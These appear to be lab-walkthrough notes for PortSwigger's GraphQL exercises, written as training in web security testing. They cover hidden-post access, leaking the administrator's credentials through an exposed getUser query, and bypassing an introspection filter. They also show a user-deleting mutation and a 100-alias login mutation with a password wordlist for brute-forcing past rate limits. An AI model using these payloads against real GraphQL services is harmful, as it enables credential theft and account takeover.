**Accessing private GraphQL posts**

From <https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts> 

Accessing blog page show show that blog post are retrieved using graphql query 

• In Burp, go to Proxy > HTTP history and notice the following: 
	• Blog posts are retrieved using a GraphQL query.
	• In the response to the GraphQL query, each blog post has its own sequential id.
	• Blog post id 3 is missing from the list. This indicates that there is a hidden blog post.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/edd52580-aa52-4084-9c97-23d837e7057d)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/782357e1-8d9c-4c8b-bf6f-283c900143b6)








Use InQL to scan the GraphQL endpoint. Notice that the BlogPost type has a postPassword field available. 

From <https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1b96ff04-60cf-4e3d-876f-2293803c9bae)





• In Repeater, modify the id variable to 3 (that is, the id of the hidden blog post). Add the postPassword field to the query. 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/44c89500-8934-466e-b9eb-d829b8e69bc6)








**Accidental exposure of private GraphQL fields**

From <https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure> 


Log in is sent as graphql mutation 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4b26cccf-4ed9-462f-bad8-48ef7d823a05)





Scan using inql 

• There is a getUser query that returns a user's username and password.
• This query fetches the relevant user information via a direct reference to an id number.

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/8aa6af0e-8a47-4a98-beb6-0544d007821c)



Send to repeater and change the id to 1 to get the username and password of administrator 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/78cfa929-7c0e-450a-9995-c42ef85f3ca6)



**Finding a hidden GraphQL endpoint**

From <https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint> 

Since our graphql endpoint is hidden we can use common directory like 
/api to check 

"Query not present" indicates graphql 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9ea26b07-89e2-4599-b7af-dc33a731c9d6)


Amend universal query to confirm graphql endpoin
`api?query=query{__typename}.`
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bec62b38-1d2d-422a-9cc7-79622fa1a202)




Adding universal introspectionquery

```
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```


Url encode and send to the api parameter
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ab055e3f-d39b-45be-9dbc-d37bfe381087)

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d3526cdc-45e3-4248-a5f3-76783a19a0a9)


the response that introspection is disallowed

From <https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint> 


Burpesuite version
```
/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

From <https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint> 

Modify the query to include a newline character after __schema and resend. 

From <https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint> 



  ```
/api?query=query IntrospectionQuery {
  __schema
 {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cebd265b-8f92-443f-975f-f61b227a7462)





• Notice that the response now includes full introspection details. This is because the server is configured to exclude queries matching the regex "__schema{", which the query no longer matches even though it is still a valid introspection query. 
• Save the introspection response body as a local JSON file. 
• Go to the InQL Scanner tab and scan the saved file. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/030f2371-83f0-4a71-bdf6-402144cb9110)


![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6e75adfb-0613-46ba-af61-fa8d44726445)




Send the getUser query to decoder and url encode
User 3 is carlos
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b4710dc4-2804-4a06-9f6e-2c1cbc5c1121)
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d2179fb4-60b1-4ded-9683-f273966e400f)








Notice the delete user from previous 

```
mutation {
    deleteOrganizationUser(input: DeleteOrganizationUserInput) {
        user {
            id
            username
        }
    }
}
```


Send to decoder and url encode


```
mutation {
	deleteOrganizationUser(input:{id: 3}) {
		user {
			id
		}
	}
}
```
                                

User been deleted
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/384a8387-d902-4245-99de-0dccb91fffcc)




***Bypassing GraphQL brute force protections***

From <https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass> 

Login and send request to inqlscanner
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/941f39a9-3d6f-4dbf-a39c-2dee050e5f47)



Notice 

• In Repeater, attempt some further login requests. Note that after a short period of time the API starts to return a rate limit error. 

From <https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass> 


Craft a request that uses aliases to send multiple login mutations in one message. See the lab instructions for a tip that will make this process less time-consuming. 

From <https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass> 



  ```
mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...
```

 ```
bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }
    }
```

You can then use the generated aliases when crafting your request in Repeater. 

From <https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass> 




To get our wordlist we use the following given to us by burpesuite 

```
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
``` 

From <https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass> 

Paste in DOM console 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3dee92b1-6185-459f-86cb-df87bbba0326)




Our exploit 
```
mutation {
    bruteforce0: login(input: { password: "123456", username: "carlos" }) {
        token
        success
    }
    bruteforce1: login(input: { password: "password", username: "carlos" }) {
        token
        success
    }
    bruteforce2: login(input: { password: "12345678", username: "carlos" }) {
        token
        success
    }
    bruteforce3: login(input: { password: "qwerty", username: "carlos" }) {
        token
        success
    }
    bruteforce4: login(input: { password: "123456789", username: "carlos" }) {
        token
        success
    }
    bruteforce5: login(input: { password: "12345", username: "carlos" }) {
        token
        success
    }
    bruteforce6: login(input: { password: "1234", username: "carlos" }) {
        token
        success
    }
    bruteforce7: login(input: { password: "111111", username: "carlos" }) {
        token
        success
    }
    bruteforce8: login(input: { password: "1234567", username: "carlos" }) {
        token
        success
    }
    bruteforce9: login(input: { password: "dragon", username: "carlos" }) {
        token
        success
    }
    bruteforce10: login(input: { password: "123123", username: "carlos" }) {
        token
        success
    }
    bruteforce11: login(input: { password: "baseball", username: "carlos" }) {
        token
        success
    }
    bruteforce12: login(input: { password: "abc123", username: "carlos" }) {
        token
        success
    }
    bruteforce13: login(input: { password: "football", username: "carlos" }) {
        token
        success
    }
    bruteforce14: login(input: { password: "monkey", username: "carlos" }) {
        token
        success
    }
    bruteforce15: login(input: { password: "letmein", username: "carlos" }) {
        token
        success
    }
    bruteforce16: login(input: { password: "shadow", username: "carlos" }) {
        token
        success
    }
    bruteforce17: login(input: { password: "master", username: "carlos" }) {
        token
        success
    }
    bruteforce18: login(input: { password: "666666", username: "carlos" }) {
        token
        success
    }
    bruteforce19: login(input: { password: "qwertyuiop", username: "carlos" }) {
        token
        success
    }
    bruteforce20: login(input: { password: "123321", username: "carlos" }) {
        token
        success
    }
    bruteforce21: login(input: { password: "mustang", username: "carlos" }) {
        token
        success
    }
    bruteforce22: login(input: { password: "1234567890", username: "carlos" }) {
        token
        success
    }
    bruteforce23: login(input: { password: "michael", username: "carlos" }) {
        token
        success
    }
    bruteforce24: login(input: { password: "654321", username: "carlos" }) {
        token
        success
    }
    bruteforce25: login(input: { password: "superman", username: "carlos" }) {
        token
        success
    }
    bruteforce26: login(input: { password: "1qaz2wsx", username: "carlos" }) {
        token
        success
    }
    bruteforce27: login(input: { password: "7777777", username: "carlos" }) {
        token
        success
    }
    bruteforce28: login(input: { password: "121212", username: "carlos" }) {
        token
        success
    }
    bruteforce29: login(input: { password: "000000", username: "carlos" }) {
        token
        success
    }
    bruteforce30: login(input: { password: "qazwsx", username: "carlos" }) {
        token
        success
    }
    bruteforce31: login(input: { password: "123qwe", username: "carlos" }) {
        token
        success
    }
    bruteforce32: login(input: { password: "killer", username: "carlos" }) {
        token
        success
    }
    bruteforce33: login(input: { password: "trustno1", username: "carlos" }) {
        token
        success
    }
    bruteforce34: login(input: { password: "jordan", username: "carlos" }) {
        token
        success
    }
    bruteforce35: login(input: { password: "jennifer", username: "carlos" }) {
        token
        success
    }
    bruteforce36: login(input: { password: "zxcvbnm", username: "carlos" }) {
        token
        success
    }
    bruteforce37: login(input: { password: "asdfgh", username: "carlos" }) {
        token
        success
    }
    bruteforce38: login(input: { password: "hunter", username: "carlos" }) {
        token
        success
    }
    bruteforce39: login(input: { password: "buster", username: "carlos" }) {
        token
        success
    }
    bruteforce40: login(input: { password: "soccer", username: "carlos" }) {
        token
        success
    }
    bruteforce41: login(input: { password: "harley", username: "carlos" }) {
        token
        success
    }
    bruteforce42: login(input: { password: "batman", username: "carlos" }) {
        token
        success
    }
    bruteforce43: login(input: { password: "andrew", username: "carlos" }) {
        token
        success
    }
    bruteforce44: login(input: { password: "tigger", username: "carlos" }) {
        token
        success
    }
    bruteforce45: login(input: { password: "sunshine", username: "carlos" }) {
        token
        success
    }
    bruteforce46: login(input: { password: "iloveyou", username: "carlos" }) {
        token
        success
    }
    bruteforce47: login(input: { password: "2000", username: "carlos" }) {
        token
        success
    }
    bruteforce48: login(input: { password: "charlie", username: "carlos" }) {
        token
        success
    }
    bruteforce49: login(input: { password: "robert", username: "carlos" }) {
        token
        success
    }
    bruteforce50: login(input: { password: "thomas", username: "carlos" }) {
        token
        success
    }
    bruteforce51: login(input: { password: "hockey", username: "carlos" }) {
        token
        success
    }
    bruteforce52: login(input: { password: "ranger", username: "carlos" }) {
        token
        success
    }
    bruteforce53: login(input: { password: "daniel", username: "carlos" }) {
        token
        success
    }
    bruteforce54: login(input: { password: "starwars", username: "carlos" }) {
        token
        success
    }
    bruteforce55: login(input: { password: "klaster", username: "carlos" }) {
        token
        success
    }
    bruteforce56: login(input: { password: "112233", username: "carlos" }) {
        token
        success
    }
    bruteforce57: login(input: { password: "george", username: "carlos" }) {
        token
        success
    }
    bruteforce58: login(input: { password: "computer", username: "carlos" }) {
        token
        success
    }
    bruteforce59: login(input: { password: "michelle", username: "carlos" }) {
        token
        success
    }
    bruteforce60: login(input: { password: "jessica", username: "carlos" }) {
        token
        success
    }
    bruteforce61: login(input: { password: "pepper", username: "carlos" }) {
        token
        success
    }
    bruteforce62: login(input: { password: "1111", username: "carlos" }) {
        token
        success
    }
    bruteforce63: login(input: { password: "zxcvbn", username: "carlos" }) {
        token
        success
    }
    bruteforce64: login(input: { password: "555555", username: "carlos" }) {
        token
        success
    }
    bruteforce65: login(input: { password: "11111111", username: "carlos" }) {
        token
        success
    }
    bruteforce66: login(input: { password: "131313", username: "carlos" }) {
        token
        success
    }
    bruteforce67: login(input: { password: "freedom", username: "carlos" }) {
        token
        success
    }
    bruteforce68: login(input: { password: "777777", username: "carlos" }) {
        token
        success
    }
    bruteforce69: login(input: { password: "pass", username: "carlos" }) {
        token
        success
    }
    bruteforce70: login(input: { password: "maggie", username: "carlos" }) {
        token
        success
    }
    bruteforce71: login(input: { password: "159753", username: "carlos" }) {
        token
        success
    }
    bruteforce72: login(input: { password: "aaaaaa", username: "carlos" }) {
        token
        success
    }
    bruteforce73: login(input: { password: "ginger", username: "carlos" }) {
        token
        success
    }
    bruteforce74: login(input: { password: "princess", username: "carlos" }) {
        token
        success
    }
    bruteforce75: login(input: { password: "joshua", username: "carlos" }) {
        token
        success
    }
    bruteforce76: login(input: { password: "cheese", username: "carlos" }) {
        token
        success
    }
    bruteforce77: login(input: { password: "amanda", username: "carlos" }) {
        token
        success
    }
    bruteforce78: login(input: { password: "summer", username: "carlos" }) {
        token
        success
    }
    bruteforce79: login(input: { password: "love", username: "carlos" }) {
        token
        success
    }
    bruteforce80: login(input: { password: "ashley", username: "carlos" }) {
        token
        success
    }
    bruteforce81: login(input: { password: "nicole", username: "carlos" }) {
        token
        success
    }
    bruteforce82: login(input: { password: "chelsea", username: "carlos" }) {
        token
        success
    }
    bruteforce83: login(input: { password: "biteme", username: "carlos" }) {
        token
        success
    }
    bruteforce84: login(input: { password: "matthew", username: "carlos" }) {
        token
        success
    }
    bruteforce85: login(input: { password: "access", username: "carlos" }) {
        token
        success
    }
    bruteforce86: login(input: { password: "yankees", username: "carlos" }) {
        token
        success
    }
    bruteforce87: login(input: { password: "987654321", username: "carlos" }) {
        token
        success
    }
    bruteforce88: login(input: { password: "dallas", username: "carlos" }) {
        token
        success
    }
    bruteforce89: login(input: { password: "austin", username: "carlos" }) {
        token
        success
    }
    bruteforce90: login(input: { password: "thunder", username: "carlos" }) {
        token
        success
    }
    bruteforce91: login(input: { password: "taylor", username: "carlos" }) {
        token
        success
    }
    bruteforce92: login(input: { password: "matrix", username: "carlos" }) {
        token
        success
    }
    bruteforce93: login(input: { password: "mobilemail", username: "carlos" }) {
        token
        success
    }
    bruteforce94: login(input: { password: "mom", username: "carlos" }) {
        token
        success
    }
    bruteforce95: login(input: { password: "monitor", username: "carlos" }) {
        token
        success
    }
    bruteforce96: login(input: { password: "monitoring", username: "carlos" }) {
        token
        success
    }
    bruteforce97: login(input: { password: "montana", username: "carlos" }) {
        token
        success
    }
    bruteforce98: login(input: { password: "moon", username: "carlos" }) {
        token
        success
    }
    bruteforce99: login(input: { password: "moscow", username: "carlos" }) {
        token
        success
    }
}
```



Our password
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fdcd52a4-f2d2-405a-b49a-7a708deb9e02)


